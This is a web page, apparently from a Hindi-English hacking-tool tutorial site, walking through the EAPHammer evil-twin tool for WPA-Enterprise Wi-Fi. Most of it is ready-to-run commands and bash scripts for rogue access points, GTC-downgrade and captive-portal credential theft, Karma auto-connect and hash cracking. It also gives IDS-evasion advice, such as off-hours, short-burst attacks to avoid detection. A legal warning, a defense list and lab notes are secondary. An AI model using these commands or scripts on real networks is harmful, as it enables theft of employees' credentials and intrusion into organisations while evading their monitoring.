import TutorialLayout from '../../components/TutorialLayout'
import CodeBlock from '../../components/CodeBlock'

export default function Eaphammer() {
  return (
    <TutorialLayout
      title="eaphammer"
      subtitle="WPA-Enterprise evil twin attack tool — credential capture, hostile portal"
      icon="📡"
      prev={{ to: '/tool/kismet', label: 'kismet' }}
      next={{ to: '/tool/sslstrip', label: 'sslstrip' }}
    >
      <h2>What is EAPHammer?</h2>
      <p>
        EAPHammer एक powerful WPA-Enterprise evil twin attack tool है जो corporate WiFi networks को target करता है। यह fake access point बनाता है जो real enterprise network जैसा दिखता है, और जब victims connect करते हैं तो उनके credentials capture हो जाते हैं। WPA-Enterprise networks में har user का अलग username/password होता है — एक shared password नहीं होता जैसे WPA2-Personal में होता है। यही इसे ज़्यादा dangerous बनाता है क्योंकि एक compromised credential से attacker network में entry ले सकता है।
      </p>
      <p>
        EAPHammer Gabriel Ryan (s0lst1c3) ने बनाया है और यह Python में लिखा गया है। यह internally hostapd-mana, FreeRADIUS-WPE, और dnsmasq use करता है — ये तीनों tools मिलकर fake access point, RADIUS server, और DHCP server चलाते हैं। EAPHammer इन सबको automate करता है ताकि attacker को manual configuration न करनी पड़े। यह Kali Linux और Kali Nethunter दोनों पर चलता है।
      </p>
      <p>
        EAPHammer की सबसे बड़ी खासियत है GTC downgrade attack — यह client को force करता है कि वो EAP-GTC authentication method use करे जो plain text में credentials भेजता है। Normally WPA-Enterprise PEAP या EAP-TTLS use करता है जो encrypted tunnel में credentials भेजता है, लेकिन GTC downgrade से यह encryption हट जाती है। यह attack बहुत effective है क्योंकि ज़्यादातर organizations GTC disable नहीं करते।
      </p>
      <p>
        EAPHammer सिर्फ credential capture नहीं करता — यह hostile portal attacks भी कर सकता है जहाँ victim को captive portal दिखता है और वो खुद अपने credentials enter करता है। Karma attacks भी support करता है जहाँ सभी probe requests का response दिया जाता है। यह tool red team operations में बहुत useful है जहाँ WPA-Enterprise network की security test करनी हो।
      </p>
      <p>
        यह tool open source है और GitHub पर available है। इसकी community active है और regular updates आते रहते हैं। EAPHammer को install करना आसान है — Kali setup script सब कुछ automatically install कर देता है। लेकिन इसके लिए compatible wireless adapter चाहिए जो monitor mode और AP mode support करे।
      </p>

      <div className="warning-box mb-6">
        <strong>⚠️ कानूनी चेतावनी:</strong> EAPHammer केवल अधिकृत पेनेट्रेशन टेस्टिंग और red team operations में ही इस्तेमाल करें। Evil twin attacks बिना अनुमति के अवैध हैं। भारत में आईटी एक्ट 2000 की धारा 43 और 66 के तहत अनधिकृत network access और credential theft गंभीर अपराध है — 3 साल तक की जेल और 5 लाख तक का जुर्माना हो सकता है। केवल अपने lab environment या लिखित authorization के साथ ही उपयोग करें।
      </div>

      <h2>History of EAPHammer</h2>
      <p>
        EAPHammer की शुरुआत 2017 में Gabriel Ryan (s0lst1c3) ने की थी। Gabriel एक security researcher हैं जो wireless security पर focus करते हैं। उन्होंने DEF CON 25 में "Attacking WPA2-Enterprise" topic पर talk दिया था जिसमें उन्होंने EAPHammer demonstrate किया। यह tool तुरंत popular हो गया क्योंकि उस समय WPA-Enterprise attacks के लिए कोई easy-to-use tool नहीं था।
      </p>
      <p>
        उस समय hostapd-mana और FreeRADIUS-WPE अलग-अलग tools थे जिन्हें manually configure करना पड़ता था। EAPHammer ने इन सबको एक single tool में integrate किया। Gabriel ने EAPHammer को इस तरह design किया कि beginners भी easily WPA-Enterprise attacks कर सकें। यह tool SpecterOps कंपनी के red team engagements में use हुआ और इसकी effectiveness prove हुई।
      </p>
      <p>
        EAPHammer v2 में कई major improvements आए — hostile portal support, better Karma attacks, और improved EAP negotiation। 2019 में इसमें GTC downgrade attack add हुआ जो इसका signature attack बन गया। आज EAPHammer WPA-Enterprise testing के लिए de facto standard tool है।
      </p>

      <h2>How EAPHammer Works?</h2>
      <p>
        EAPHammer का architecture तीन main components पर based है जो मिलकर complete evil twin infrastructure बनाते हैं:
      </p>
      <ul className="list-disc list-inside text-gray-300 mb-4 space-y-2">
        <li><strong className="text-white">hostapd-mana:</strong> Rogue access point create करता है जो target network जैसा दिखता है। यह modified hostapd है जो Karma attacks और MANA techniques support करता है</li>
        <li><strong className="text-white">FreeRADIUS-WPE:</strong> Rogue RADIUS server जो WPA-Enterprise authentication handle करता है। यह EAP messages intercept करके credentials capture करता है</li>
        <li><strong className="text-white">dnsmasq:</strong> DHCP और DNS server जो connected clients को IP addresses assign करता है और DNS queries handle करता है</li>
        <li><strong className="text-white">EAP Negotiation Engine:</strong> Client के साथ EAP authentication negotiate करता है — GTC downgrade, PEAP या EAP-TTLS selection</li>
        <li><strong className="text-white">Credential Harvester:</strong> Captured credentials को parse करके files में save करता है</li>
        <li><strong className="text-white">Hostile Portal Generator:</strong> Captive portal pages create करता है credential phishing के लिए</li>
        <li><strong className="text-white">Karma Engine:</strong> Probe requests detect करके respond करता है — devices automatically connect हो जाते हैं</li>
        <li><strong className="text-white">Monitor Mode Manager:</strong> Wireless interface को monitor mode में set करता है और channels manage करता है</li>
      </ul>
      <p>
        जब EAPHammer start होता है, तो पहले wireless interface monitor mode में जाता है। फिर hostapd-mana rogue AP start करता है target network के नाम से। FreeRADIUS-WPE RADIUS server start होता है जो EAP authentication handle करता है। dnsmasq DHCP server start करता है। जब victim connect करता है, EAP handshake होता है और credentials capture हो जाते हैं।
      </p>

      <h2>Installation</h2>
      <p>
        EAPHammer install करने के लिए कई methods available हैं। Kali setup script सबसे easy है जो सभी dependencies automatically install कर देता है।
      </p>
      <CodeBlock
        title="EAPHammer Installation"
        code={`# Git clone:
git clone https://github.com/s0lst1c3/eaphammer.git
cd eaphammer

# Kali setup (recommended — sab kuch automatic):
chmod +x kali-setup
sudo ./kali-setup

# Manual setup (agar kali-setup fail ho):
sudo apt update
sudo apt install -y libssl-dev libffi-dev python3-dev python3-pip
sudo apt install -y hostapd dnsmasq
pip3 install -r requirements.txt

# Dependencies jo automatic install hoti hain:
# - hostapd-mana (rogue AP)
# - FreeRADIUS-WPE (RADIUS server)
# - dnsmasq (DHCP/DNS)

# Verify installation:
python3 eaphammer --help

# Docker se (alternative):
git clone https://github.com/s0lst1c3/eaphammer.git
cd eaphammer
docker build -t eaphammer .
docker run --rm --net=host --privileged -v /dev:/dev eaphammer --help`}
      />

      <h2>Basic Usage</h2>
      <p>
        EAPHammer का basic usage simple है — wireless interface, target SSID, और attack type specify करो।
      </p>
      <CodeBlock
        title="Basic Commands"
        code={`# Simple evil twin — credential capture:
sudo python3 eaphammer -i wlan0 --essid "CorpWiFi" --creds

# Evil twin with specific channel:
sudo python3 eaphammer -i wlan0 --essid "CorpWiFi" --channel 6 --creds

# Evil twin with BSSID spoofing:
sudo python3 eaphammer -i wlan0 --essid "CorpWiFi" --bssid AA:BB:CC:DD:EE:FF --creds

# Open evil twin (no auth required):
sudo python3 eaphammer -i wlan0 --essid "CorpWiFi" --auth open

# Hostile portal attack:
sudo python3 eaphammer -i wlan0 --essid "CorpWiFi" --hostile-portal

# Karma attack:
sudo python3 eaphammer -i wlan0 --essid "CorpWiFi" --creds --karma

# GTC downgrade (plain text creds):
sudo python3 eaphammer -i wlan0 --essid "CorpWiFi" --creds --negotiate gtc-downgrade

# Verbose output:
sudo python3 eaphammer -i wlan0 --essid "CorpWiFi" --creds -v

# Custom output directory:
sudo python3 eaphammer -i wlan0 --essid "CorpWiFi" --creds --output /tmp/results`}
      />

      <h2>Important Options</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">Flag</th>
              <th className="text-left py-2 px-3 text-neon-green">क्या करता है</th>
              <th className="text-left py-2 px-3 text-neon-green">उदाहरण</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-i</td><td className="py-2 px-3">Wireless interface specify करें</td><td className="py-2 px-3 font-mono text-xs">-i wlan0</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--essid</td><td className="py-2 px-3">Target WiFi network name (SSID)</td><td className="py-2 px-3 font-mono text-xs">--essid "CorpWiFi"</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--bssid</td><td className="py-2 px-3">Target AP MAC address spoof</td><td className="py-2 px-3 font-mono text-xs">--bssid AA:BB:CC:DD:EE:FF</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--channel</td><td className="py-2 px-3">WiFi channel (default auto)</td><td className="py-2 px-3 font-mono text-xs">--channel 6</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--creds</td><td className="py-2 px-3">Credential capture mode enable</td><td className="py-2 px-3 font-mono text-xs">--creds</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--auth</td><td className="py-2 px-3">Authentication type (eap, open)</td><td className="py-2 px-3 font-mono text-xs">--auth open</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--hostile-portal</td><td className="py-2 px-3">Captive portal attack mode</td><td className="py-2 px-3 font-mono text-xs">--hostile-portal</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--karma</td><td className="py-2 px-3">Karma attack — all probes respond</td><td className="py-2 px-3 font-mono text-xs">--karma</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--negotiate</td><td className="py-2 px-3">EAP negotiation type</td><td className="py-2 px-3 font-mono text-xs">--negotiate gtc-downgrade</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--remote-creds</td><td className="py-2 px-3">Remote credential capture</td><td className="py-2 px-3 font-mono text-xs">--remote-creds</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--dns-redirect</td><td className="py-2 px-3">DNS redirect to specific IP</td><td className="py-2 px-3 font-mono text-xs">--dns-redirect 192.168.1.100</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--template</td><td className="py-2 px-3">Custom portal template</td><td className="py-2 px-3 font-mono text-xs">--template corporate-login</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--handshake</td><td className="py-2 px-3">Captured handshake file path</td><td className="py-2 px-3 font-mono text-xs">--handshake capture.cap</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--output</td><td className="py-2 px-3">Output directory</td><td className="py-2 px-3 font-mono text-xs">--output /tmp/results</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">-v</td><td className="py-2 px-3">Verbose output</td><td className="py-2 px-3 font-mono text-xs">-v</td></tr>
          </tbody>
        </table>
      </div>

      <h2>Evil Twin Attack (Detailed)</h2>
      <p>
        Evil twin attack EAPHammer का primary attack है। इसमें target network के जैसा नाम का fake AP बनाया जाता है। जब victim device auto-connect try करता है, तो evil AP से connect हो जाता है और EAP authentication process में credentials capture हो जाते हैं।
      </p>
      <CodeBlock
        title="Step-by-Step Evil Twin"
        code={`# Step 1: Target network identify करो:
sudo airodump-ng wlan0
# SSID: CorpWiFi
# Channel: 6
# BSSID: AA:BB:CC:DD:EE:FF
# Auth: WPA2-Enterprise (802.1X)

# Step 2: Interface prepare करो:
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# Step 3: Evil twin start करो:
sudo python3 eaphammer -i wlan0 --essid "CorpWiFi" \\
  --channel 6 --bssid AA:BB:CC:DD:EE:FF --creds

# Step 4: Wait — victims connect hone do
# EAPHammer automatically EAP handshake capture karega

# Step 5: Captured credentials check करो:
cat output/creds.txt

# Step 6: Hash crack करो:
hashcat -m 5500 output/hashes.txt rockyou.txt`}
      />

      <h2>WPA-Enterprise Attack Methods</h2>
      <p>
        EAPHammer कई तरह के WPA-Enterprise attacks support करता है:
      </p>
      <CodeBlock
        title="EAP Authentication Methods"
        code={`# PEAP attack (Protected EAP):
# - Most common in corporate networks
# - MS-CHAPv2 hash capture hota hai
# - Hash crack karke password milta hai
sudo python3 eaphammer -i wlan0 --essid "CorpWiFi" --creds --negotiate downgrade

# EAP-TTLS attack:
# - Tunneled TLS authentication
# - Certificate validation bypass
sudo python3 eaphammer -i wlan0 --essid "CorpWiFi" --creds

# EAP-TLS (certificate-based):
# - Sabse secure method
# - Client certificate chahiye — difficult to attack
# - Lekin rogue CA se possible hai

# GTC downgrade attack:
# - Client ko force karo GTC use karne ke liye
# - GTC plain text mein credentials bhejta hai
# - MOST EFFECTIVE ATTACK!
sudo python3 eaphammer -i wlan0 --essid "CorpWiFi" \\
  --creds --negotiate gtc-downgrade`}
      />

      <h2>Credential Harvesting</h2>
      <p>
        EAPHammer credentials capture करने के कई methods provide करता है — direct EAP capture, hostile portal, और GTC downgrade।
      </p>
      <CodeBlock
        title="Credential Capture Methods"
        code={`# Method 1: Direct EAP capture:
sudo python3 eaphammer -i wlan0 --essid "CorpWiFi" --creds
# MS-CHAPv2 hash capture hota hai
# Hashcat ya John se crack karo

# Method 2: GTC downgrade (plain text!):
sudo python3 eaphammer -i wlan0 --essid "CorpWiFi" \\
  --creds --negotiate gtc-downgrade
# Plain text username/password directly milta hai!

# Method 3: Hostile portal:
sudo python3 eaphammer -i wlan0 --essid "CorpWiFi" \\
  --hostile-portal
# Victim ko fake login page dikhta hai
# Credentials directly plain text mein milte hain

# Method 4: Karma + credential capture:
sudo python3 eaphammer -i wlan0 --essid "CorpWiFi" \\
  --creds --karma
# Sab probe requests ka respond karo
# Auto-connect victims se credentials capture

# Captured credentials location:
ls output/
# creds.txt — captured credentials
# hashes.txt — MS-CHAPv2 hashes
# eaphammer.log — detailed log`}
      />

      <h2>Hostile Portal Attack</h2>
      <p>
        Hostile portal attack captive portal technique use करता है — victim को fake login page दिखता है जहाँ वो खुद credentials enter करता है। यह attack बहुत effective है क्योंकि victim को पता भी नहीं चलता।
      </p>
      <CodeBlock
        title="Hostile Portal Setup"
        code={`# Basic hostile portal:
sudo python3 eaphammer -i wlan0 --essid "CorpWiFi" --hostile-portal

# Corporate-style portal:
sudo python3 eaphammer -i wlan0 --essid "CorpWiFi" \\
  --hostile-portal --template corporate-login

# Portal with DNS redirect:
sudo python3 eaphammer -i wlan0 --essid "CorpWiFi" \\
  --hostile-portal --dns-redirect 192.168.1.100

# Portal + Karma (maximum victims):
sudo python3 eaphammer -i wlan0 --hostile-portal --karma

# Kya hota hai:
# 1. Victim evil AP se connect hota hai
# 2. Browser open karta hai → captive portal dikhta hai
# 3. "Enter your corporate credentials" message
# 4. Victim username/password enter karta hai
# 5. Credentials plain text mein capture ho jaate hain
# 6. Victim ko real internet redirect kar do`}
      />

      <h2>Karma Attack</h2>
      <p>
        Karma attack सबसे dangerous WiFi attack है — यह हर probe request का response देता है। Devices known networks के लिए probe bhejte hain, और Karma un sabka jawab देता है ताकि devices auto-connect हो जाएं।
      </p>
      <CodeBlock
        title="Karma Attack Details"
        code={`# Karma attack:
sudo python3 eaphammer -i wlan0 --essid "CorpWiFi" --creds --karma

# Karma kaise kaam karta hai:
# 1. Device "CorpWiFi" ke liye probe request bhejta hai
# 2. EAPHammer respond karta hai "Haan, main CorpWiFi hoon"
# 3. Device automatically connect ho jaata hai
# 4. EAP authentication start hota hai
# 5. Credentials capture ho jaate hain

# Karma + hostile portal (maximum damage):
sudo python3 eaphammer -i wlan0 --hostile-portal --karma

# Karma + GTC downgrade (plain text creds):
sudo python3 eaphammer -i wlan0 --creds --karma --negotiate gtc-downgrade

# Limitations:
# - Modern devices (iOS 14+, Android 10+) probe randomization use karte hain
# - Sirf wohi devices vulnerable hain jo auto-connect karte hain
# - Windows laptops generally vulnerable hote hain`}
      />

      <h2>Certificate Forgery</h2>
      <p>
        EAPHammer fake RADIUS certificates generate करता है जो real network जैसे दिखते हैं। यह certificate-based attacks का foundation है।
      </p>
      <CodeBlock
        title="Certificate Operations"
        code={`# EAPHammer automatically fake certificates generate करता है
# target network ke basis पर

# Custom certificate generate करो:
# EAPHammer की config directory में certificate options हैं

# Certificate files location:
ls certs/
# ca.pem — Certificate Authority
# server.pem — Server certificate
# server.key — Server private key

# Real network ka certificate copy करो (recon se):
# Target RADIUS server ka CN (Common Name) note करो
# EAPHammer same CN se fake certificate banayega

# Certificate validation bypass:
# Agar client certificate validation check nahi karta
# toh fake certificate se authentication ho jaayega

# Windows clients:
# Windows "Do you trust this server?" prompt dikhata hai
# Agar user "Connect" click kare → credentials capture

# macOS/iOS clients:
# Stricter certificate validation
# Lekin phir bhi vulnerable agar CN match ho`}
      />

      <h2>PMKID Capture</h2>
      <p>
        EAPHammer PMKID capture भी support करता है — यह WPA/WPA2 network ka hash capture करने का तरीका है जिसमें client की ज़रूरत नहीं होती।
      </p>
      <CodeBlock
        title="PMKID Attack"
        code={`# PMKID capture ke liye specially configured evil AP:
sudo python3 eaphammer -i wlan0 --essid "CorpWiFi" --creds

# PMKID capture process:
# 1. Evil AP broadcast karta hai target SSID
# 2. Client probe request bhejta hai
# 3. Evil AP PMKID ke saath respond karta hai
# 4. PMKID hash capture hota hai

# Captured PMKID crack karo:
hashcat -m 16800 pmkid_hash.txt rockyou.txt

# PMKID vs Handshake:
# PMKID: Sirf 1 hash, client connect hone se pehle bhi mil sakta hai
# Handshake: 4-way handshake, client connect hone par milta hai
# PMKID faster hai lekin sirf WPA/WPA2-Personal ke liye`}
      />

      <h2>Attack Types Comparison</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">Attack</th>
              <th className="text-left py-2 px-3 text-neon-green">Method</th>
              <th className="text-left py-2 px-3 text-neon-green">Result</th>
              <th className="text-left py-2 px-3 text-neon-green">Difficulty</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Evil Twin (EAP)</td><td className="py-2 px-3">Fake AP + EAP handshake</td><td className="py-2 px-3">MS-CHAPv2 hash</td><td className="py-2 px-3">Medium</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">GTC Downgrade</td><td className="py-2 px-3">Force GTC authentication</td><td className="py-2 px-3">Plain text credentials</td><td className="py-2 px-3">Easy</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Hostile Portal</td><td className="py-2 px-3">Captive portal + phishing</td><td className="py-2 px-3">Plain text credentials</td><td className="py-2 px-3">Easy</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Karma + EAP</td><td className="py-2 px-3">Probe response + EAP</td><td className="py-2 px-3">Auto-connect victims</td><td className="py-2 px-3">Medium</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Karma + Portal</td><td className="py-2 px-3">Probe response + portal</td><td className="py-2 px-3">Maximum victims</td><td className="py-2 px-3">Easy</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Evil Twin (Open)</td><td className="py-2 px-3">Open AP same SSID</td><td className="py-2 px-3">Traffic interception</td><td className="py-2 px-3">Easy</td></tr>
            <tr><td className="py-2 px-3 text-white">PMKID Capture</td><td className="py-2 px-3">Probe response</td><td className="py-2 px-3">WPA hash (no client needed)</td><td className="py-2 px-3">Easy</td></tr>
          </tbody>
        </table>
      </div>

      <h2>IDS Evasion Techniques</h2>
      <p>
        Wireless IDS/IPS systems evil twin attacks detect कर सकते हैं। EAPHammer कुछ basic evasion techniques provide करता है:
      </p>
      <CodeBlock
        title="Evasion Methods"
        code={`# Channel matching — target ke same channel par raho:
sudo python3 eaphammer -i wlan0 --essid "CorpWiFi" --channel 6 --creds

# BSSID spoofing — real AP ka MAC use karo:
sudo python3 eaphammer -i wlan0 --essid "CorpWiFi" \\
  --bssid AA:BB:CC:DD:EE:FF --creds

# Signal strength — real AP se zyada strong signal:
# Physical location close karo target se

# Timing — off-hours mein attack karo jab monitoring kam ho:
# Raat ko ya weekend par

# Short burst attack:
# Jaldi se credentials capture karo aur band kar do
# WIDS mein alert generate hone se pehle

# EAP type matching:
# Target network jo EAP type use karta hai wahi use karo
# Anomaly detection se bachne ke liye

# Important:
# Modern WIDS bahut advanced hain
# Evil twin detection multiple methods se karte hain
# 100% evasion guarantee nahi hai`}
      />

      <h2>Scripting and Automation</h2>
      <CodeBlock
        title="Automated Attack Script"
        code={`#!/bin/bash
# Automated WPA-Enterprise audit script

INTERFACE="wlan0"
TARGET_SSID="$1"
CHANNEL="$2"

if [ -z "$TARGET_SSID" ]; then
  echo "Usage: $0 <SSID> [channel]"
  exit 1
fi

echo "[*] Starting EAPHammer attack on: $TARGET_SSID"

# Kill interfering processes:
sudo airmon-ng check kill

# Start monitor mode:
sudo airmon-ng start $INTERFACE

# Start EAPHammer with GTC downgrade:
sudo python3 eaphammer -i \${INTERFACE} \\
  --essid "$TARGET_SSID" \\
  --channel "$CHANNEL" \\
  --creds \\
  --negotiate gtc-downgrade \\
  -v

echo "[*] Check output/ directory for captured credentials"`}
      />

      <CodeBlock
        title="Multi-Network Scanner"
        code={`#!/bin/bash
# Multiple networks ke liye automated attack

INTERFACE="wlan0"
NETWORKS=("CorpWiFi" "GuestNetwork" "OfficeWiFi")

for SSID in "CorpWiFi" "GuestNetwork" "OfficeWiFi"; do
  echo "[+] Targeting: $SSID"
  sudo python3 eaphammer -i $INTERFACE \\
    --essid "$SSID" \\
    --creds \\
    --negotiate gtc-downgrade &

  # 5 minute wait:
  sleep 300

  # Stop:
  sudo pkill -f eaphammer
  echo "[+] Done: $SSID"
done

echo "[*] All targets processed. Check output/"`}
      />

      <CodeBlock
        title="Credential Monitor Script"
        code={`#!/bin/bash
# Captured credentials monitor

OUTPUT_DIR="output"
LAST_COUNT=0

while true; do
  CURRENT_COUNT=$(wc -l < "$OUTPUT_DIR/creds.txt" 2>/dev/null || echo 0)

  if [ "$CURRENT_COUNT" -gt "$LAST_COUNT" ]; then
    echo "[!] NEW CREDENTIALS CAPTURED!"
    echo "[+] Total: $CURRENT_COUNT"
    tail -n $((CURRENT_COUNT - LAST_COUNT)) "$OUTPUT_DIR/creds.txt"
    LAST_COUNT=$CURRENT_COUNT
  fi

  sleep 10
done`}
      />

      <h2>EAPHammer vs Other Tools</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">फ़ीचर</th>
              <th className="text-left py-2 px-3 text-neon-green">EAPHammer</th>
              <th className="text-left py-2 px-3 text-neon-green">hostapd-mana</th>
              <th className="text-left py-2 px-3 text-neon-green">Fluxion</th>
              <th className="text-left py-2 px-3 text-neon-green">Wifiphisher</th>
              <th className="text-left py-2 px-3 text-neon-green">Airgeddon</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">WPA-Enterprise</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">नहीं</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">GTC Downgrade</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">नहीं</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Hostile Portal</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">हाँ</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Karma Attack</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">हाँ (MANA)</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">नहीं</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">WPA-Personal</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">हाँ</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">CLI/GUI</td><td className="py-2 px-3">CLI</td><td className="py-2 px-3">CLI (config)</td><td className="py-2 px-3">CLI</td><td className="py-2 px-3">CLI</td><td className="py-2 px-3">GUI (bash)</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Setup Difficulty</td><td className="py-2 px-3">Easy</td><td className="py-2 px-3">Hard</td><td className="py-2 px-3">Easy</td><td className="py-2 px-3">Easy</td><td className="py-2 px-3">Easy</td></tr>
            <tr><td className="py-2 px-3 text-white">Automation</td><td className="py-2 px-3">Scriptable</td><td className="py-2 px-3">Manual config</td><td className="py-2 px-3">Automated</td><td className="py-2 px-3">Automated</td><td className="py-2 px-3">Menu-driven</td></tr>
          </tbody>
        </table>
      </div>

      <h2>Common Problems and Solutions</h2>
      <div className="space-y-3 mt-4">
        {[
          { q: 'Wireless interface nahi mil raha', a: 'iwconfig ya airmon-ng se check karo। Compatible adapter chahiye jo monitor mode support kare (Atheros/Realtek chipsets best)। USB adapter use karo agar built-in supported nahi hai।' },
          { q: 'Victim connect nahi ho raha evil AP se', a: 'Channel same hona chahiye target network se। Evil AP ka signal real AP se strong hona chahiye। Karma mode try karo। Auto-connect enabled devices dhundho।' },
          { q: 'Credentials capture nahi ho rahe', a: 'EAP negotiation check karo — GTC downgrade try karo। Victim device EAP support karna chahiye। Output directory check karo। Verbose mode (-v) enable karo।' },
          { q: 'hostapd-mana start nahi ho raha', a: 'Wireless adapter AP mode support karna chahiye। Doosra adapter try karo। hostapd-mana properly install hona chahiye — kali-setup se reinstall karo।' },
          { q: 'FreeRADIUS-WPE error de raha hai', a: 'Port 1812/1813 free hona chahiye। Koi aur RADIUS server running nahi hona chahiye। Permissions check karo — root se run karo।' },
          { q: 'Karma attack kaam nahi kar raha', a: 'Modern devices (iOS 14+, Android 10+) probe randomization use karte hain। Purane devices target karo। Windows laptops generally vulnerable hote hain।' },
          { q: 'Hostile portal page nahi dikh raha', a: 'DNS redirect properly configure hona chahiye। dnsmasq running check karo। Browser captive portal detection try karo — http://neverssl.com open karo।' },
          { q: 'Detection se kaise bachen', a: 'Short burst attacks karo — jaldi credentials capture karo aur band kar do। BSSID spoof karo। Channel match karo। Off-hours mein attack karo।' },
        ].map((item, i) => (
          <div key={i} className="glass-card p-4">
            <h4 className="text-white font-mono font-semibold mb-2">Q: {item.q}</h4>
            <p className="text-gray-400 text-sm">A: {item.a}</p>
          </div>
        ))}
      </div>

      <h2>Detection and Defense</h2>
      <p>
        Corporate WiFi administrators को evil twin attacks से बचने के लिए यह measures लेने चाहिए:
      </p>
      <ul className="list-disc list-inside text-gray-300 mb-4 space-y-2">
        <li><strong className="text-white">Wireless IDS/IPS Deploy:</strong> Rogue AP detection — evil twin automatically detect होगा। WIDS tools: Kismet, AirMagnet, Cisco WLC</li>
        <li><strong className="text-white">EAP-TLS Enforce:</strong> Certificate-based authentication सबसे secure है। PEAP/EAP-TTLS disable करो जहाँ possible हो</li>
        <li><strong className="text-white">GTC Disable:</strong> EAP-GTC completely disable करो RADIUS server पर। GTC downgrade attack से bachne ka sabse effective tarika</li>
        <li><strong className="text-white">Certificate Pinning:</strong> Clients में RADIUS server certificate pin करो। सिर्फ trusted CA से signed certificates accept करो</li>
        <li><strong className="text-white">Client Configuration:</strong> Auto-connect disable करो। "Do not connect to non-preferred networks" enable करो</li>
        <li><strong className="text-white">802.11w (PMF):</strong> Protected Management Frames enable करो — deauthentication attacks prevent होंगे</li>
        <li><strong className="text-white">Network Segmentation:</strong> WiFi network को segmented रखो। Guest और corporate networks अलग रखो</li>
        <li><strong className="text-white">Regular Audits:</strong> Regular wireless security audits करो। Rogue AP scanning tools daily run करो</li>
        <li><strong className="text-white">Physical Security:</strong> Unauthorized access points physically remove करो। Building access control</li>
        <li><strong className="text-white">User Training:</strong> Employees को suspicious WiFi networks के बारे में educate करो। Certificate warnings को seriously लेना सिखाओ</li>
      </ul>

      <h2>Lab Environment Setup</h2>
      <p>
        EAPHammer practice के लिए safe lab environment बनाना ज़रूरी है:
      </p>
      <CodeBlock
        title="Lab Setup Guide"
        code={`# Hardware requirements:
# 1. Kali Linux machine (attacker)
# 2. Compatible wireless adapter (monitor + AP mode)
#    - Alfa AWUS036ACH (recommended)
#    - Alfa AWUS036NHA (Atheros chipset)
# 3. Target device (victim — phone/laptop)
# 4. Spare router (fake enterprise network)

# Step 1: Enterprise WiFi lab setup:
# Router पर WPA-Enterprise enable करो
# FreeRADIUS install करो (test RADIUS server)
# Test users create करो

# Step 2: Kali machine setup:
git clone https://github.com/s0lst1c3/eaphammer.git
cd eaphammer
sudo ./kali-setup

# Step 3: Wireless adapter setup:
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# Step 4: Test attack:
sudo python3 eaphammer -i wlan0 --essid "TestNetwork" \\
  --creds --negotiate gtc-downgrade

# Step 5: Victim device se connect karo
# Captured credentials check करो

# Practice exercises:
# 1. Basic evil twin attack
# 2. GTC downgrade attack
# 3. Hostile portal attack
# 4. Karma + evil twin combo
# 5. Custom portal template banana`}
      />

      <h2>Advanced Techniques</h2>
      <CodeBlock
        title="Advanced EAPHammer Usage"
        code={`# Custom certificate generation:
# Target network ka certificate CN (Common Name) copy karo
# Same CN se fake certificate generate karo
# EAPHammer automatically karta hai agar BSSID specify karo

# Multi-interface attack:
# Ek interface se deauth karo, doosre se evil AP chalao
sudo python3 eaphammer -i wlan0 --essid "CorpWiFi" --creds
# Dosre terminal mein:
